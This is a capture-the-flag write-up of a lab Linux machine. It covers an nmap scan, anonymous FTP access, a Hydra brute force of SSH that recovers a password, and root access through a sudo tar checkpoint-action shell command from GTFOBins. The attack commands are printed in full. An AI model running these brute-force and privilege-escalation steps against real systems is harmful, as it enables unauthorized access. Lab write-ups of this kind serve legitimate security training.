# Target — CTF Write-up

## Target Information

| Information | Details |
|---|---|
| **Target IP** | `10.130.147.142` |
| **Operating System** | Linux 5.15.0-139-generic |

---

## Enumeration

### Nmap Scan

The initial step was to perform an Nmap scan to discover open ports and running services on the target machine:

```bash
nmap -sC -sV -p- 10.130.147.142
```

### Scan Results

```text
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-23 11:30 +0100
Nmap scan report for 10.130.147.142
Host is up (0.084s latency).
Not shown: 967 filtered tcp ports (no-response), 30 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 550 Permission denied.
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.137.233
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 1c:3c:5f:e1:d9:9d:6c:46:1c:1d:d7:7f:c6:e1:b9:62 (RSA)
|   256 8b:79:77:e5:a0:5a:68:cd:4d:b6:61:86:48:ff:53:c7 (ECDSA)
|_  256 af:4c:94:1f:dd:3a:8d:02:65:c6:96:ab:3e:82:29:bc (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.49 seconds
```

### Findings

The scan revealed three open TCP ports:

- **Port 21/tcp** → FTP (`vsftpd 3.0.5`) with Anonymous login allowed
- **Port 22/tcp** → SSH (`OpenSSH 8.2p1 Ubuntu`)
- **Port 80/tcp** → HTTP (`Apache httpd 2.4.41`)

---

## Exploitation

### FTP Enumeration

Connecting via FTP anonymously revealed two files:
- `task.txt`: Provided a username hint (`lin`).
- `locks.txt`: Functioned as a password wordlist.

### SSH Brute Force

Attempted directory busting on the web server (Port 80) and searched for vulnerabilities in Apache 2.4.41, but neither yielded useful results.

Using the gathered credentials, an SSH brute-force attack was performed with `Hydra`:

```bash
hydra -l lin -P locks.txt ssh://10.130.147.142
```

Valid credentials were discovered:

```text
Username: lin
Password: RedDr4gonSynd1cat3
```

### Initial Access

Logging in via SSH using the recovered credentials provided initial system access as the user `lin`:

```bash
ssh lin@10.130.147.142
```

The user flag `user.txt` was located in the user's home directory.

---

## Privilege Escalation

### Sudo Permissions

Checking allowed sudo commands for the user `lin`:

```bash
sudo -l
```

The output indicated that `lin` can run `/bin/tar` with root privileges without a password.

### GTFOBins Exploitation (`tar`)

Leveraging GTFOBins techniques, root privileges were obtained using the `tar` checkpoint execution flag:

```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

Executing this command granted a **root shell**.

The root flag `root.txt` was retrieved from the `/root` directory.

---

## Flags

### User Flag

```text
THM{CR1M3_SyNd1C4T3}
```

### Root Flag

```text
THM{80UN7Y_h4cK3r}
```

---

## Lessons Learned

1. **FTP Anonymous Login:** Anonymous FTP access often yields critical sensitive files such as usernames, hints, or password lists.
2. **Credential Reuse & Brute Force:** Always utilize discovered usernames and wordlists to perform brute-force attacks against open services like SSH.
3. **Sudo Misconfigurations:** Sudo binaries listed under `sudo -l` (e.g., `tar`) should be cross-referenced with GTFOBins for instant privilege escalation paths.
4. **Methodical Reconnaissance:** Directory busting and web exploits may not always work; focus on alternate open services when web enumeration yields no results.

---

## Attack Chain Summary

```text
Port 21 (FTP)
  │
  └── Anonymous Login
          │
          ├── task.txt (Username: lin)
          │
          └── locks.txt (Password List)
                  │
                  ↓
             Hydra (SSH)
                  │
                  ↓
       User Access (lin)
                  │
                  ↓
             sudo -l
                  │
                  ↓
             /bin/tar
                  │
                  ↓
             GTFOBins
                  │
                  ↓
             Root Shell
```